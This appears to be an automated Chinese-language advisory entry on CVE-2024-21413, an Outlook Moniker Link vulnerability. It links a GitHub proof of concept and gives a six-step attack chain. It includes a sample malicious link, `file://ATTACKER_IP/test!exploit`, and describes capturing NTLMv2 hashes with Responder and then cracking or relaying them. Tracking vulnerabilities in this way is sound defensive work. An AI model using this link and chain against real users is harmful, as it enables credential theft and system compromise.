## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)